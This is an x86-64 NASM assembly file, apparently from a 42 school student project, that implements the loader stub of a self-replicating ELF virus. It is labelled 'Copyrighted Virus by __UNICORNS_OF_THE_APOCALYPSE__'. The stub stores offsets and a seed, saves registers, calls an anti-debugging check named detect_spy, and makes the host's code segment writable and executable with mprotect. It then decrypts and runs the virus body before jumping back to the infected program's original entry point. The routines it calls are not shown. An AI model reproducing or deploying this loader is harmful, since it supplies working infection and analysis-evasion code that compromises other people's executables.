; **************************************************************************** ;
;                                                                              ;
;                                                         :::      ::::::::    ;
;    loader.s                                           :+:      :+:    :+:    ;
;                                                     +:+ +:+         +:+      ;
;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
;    Updated: 2020/01/02 22:01:47 by anselme          ###   ########.fr        ;
;                                                                              ;
; **************************************************************************** ;

%define SYSCALL_WRITE		0x01
%define SYSCALL_MPROTECT	0x0a
%define STDOUT			0x01
%define PROT_RWX		0x07

section .text
	global loader_entry
	global virus_header_struct
	global mark_below
	global return_to_client

extern virus
extern decypher
extern detect_spy

loader_entry:
;------------------------------; Store variables
	call mark_below
virus_header_struct:
	db 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ; virus seed[0]
	db 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff ; virus seed[1]
	db "rel ptld", "ptldsize", "relvirus"
	db "relentry", "virusize"
	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
;------------------------------; Get variables address
; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
; | rdx  | r8          | r9          | r10         | r11          | r14        |
; | seed | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
; | seed | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
;
; The code from mark_below to
mark_below:
	pop r12
	push rbx                   ; backup rbx
	push r12                   ; backup r12
	push r13                   ; backup r13
	push r14                   ; backup r14
	push r15                   ; backup r15

	push rdi                   ; backup rdi
	push rsi                   ; backup rsi
	push rdx                   ; backup rdx
	push rcx                   ; backup rcx
	push r8                    ; backup r8
	push r9                    ; backup r9
	push r10                   ; backup r10
	push r11                   ; backup r11

	mov rdx, r12

	mov r8, rdx
	mov r9, rdx
	mov r10, rdx
	mov r11, rdx
	mov r14, rdx
	add r8, 16                 ; align vars to correct addresses
	add r9, 24
	add r10, 32
	add r11, 40
	add r14, 48
	mov r8, [r8]               ; dereference vars
	mov r9, [r9]
	mov r10, [r10]
	mov r11, [r11]
	mov r14, [r14]

	mov r12, rdx               ; get loader_entry addr
	sub r12, virus_header_struct - loader_entry

	mov rcx, r12
	xchg rcx, r8
	sub r8, rcx                ; r8 = r12 - r8
	mov rcx, r12
	xchg rcx, r10
	add r10, rcx               ; r10 = r12 + r10
	mov rcx, r12
	xchg rcx, r11
	sub r11, rcx               ; r11 = r12 - r11

	push r14                   ; save virus size    [rsp + 48]
	push r12                   ; save loader_entry  [rsp + 40]
	push r8                    ; save ptld addr     [rsp + 32]
	push r9                    ; save ptld size     [rsp + 24]
	push r10                   ; save virus addr    [rsp + 16]
	push r11                   ; save entry addr    [rsp + 8]
	push rdx                   ; save seed          [rsp]
;------------------------------; Show-off
%ifdef DEBUG
	jmp wrap_woody
after_woody:
%endif
;------------------------------; check if client behaves well
	call detect_spy
	test rax, rax
	jnz return_to_client
;------------------------------; make ptld writable
	jmp wrap_mprotect
after_mprotect:
;------------------------------; decypher virus
	mov rdi, [rsp + 16]        ; get virus_addr
	mov rsi, [rsp + 48]        ; get virus_size

	call decypher
;------------------------------; launch virus
	call virus
;------------------------------; return to client entry
return_to_client:
	mov rax, [rsp + 8]         ; get entry addr
	add rsp, 56                ; restore stack as it was

	pop r11                    ; backup r11
	pop r10                    ; backup r10
	pop r9                     ; backup r9
	pop r8                     ; backup r8
	pop rcx                    ; backup rcx
	pop rdx                    ; backup rdx
	pop rsi                    ; backup rsi
	pop rdi                    ; backup rdi

	pop r15                    ; backup r15
	pop r14                    ; backup r14
	pop r13                    ; backup r13
	pop r12                    ; backup r12
	pop rbx                    ; backup rbx

	push rax
	ret



end_of_reg_permutable_code:
;------------------------------;
; Non reg-permutable procedures
;------------------------------; mprotect wrapper
wrap_mprotect:
	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);
	mov rdi, [rsp + 32]        ; get ptld addr
	mov rsi, [rsp + 24]        ; get ptld len
	mov rdx, PROT_RWX
	mov rax, SYSCALL_MPROTECT
	syscall
	jmp after_mprotect
;------------------------------; write woody wrapper
%ifdef DEBUG
wrap_woody:
	; write(1, "....WOODY....\n", 14);
	mov rax, 0x00000a2e2e2e2e59
	push rax
	mov rax, 0x444f4f572e2e2e2e
	push rax
	mov rdi, STDOUT
	mov rsi, rsp
	mov rdx, 14
	mov rax, SYSCALL_WRITE
	syscall

	add rsp, 16
	jmp after_woody
%endif
end_of_reg_non_permutable_code:
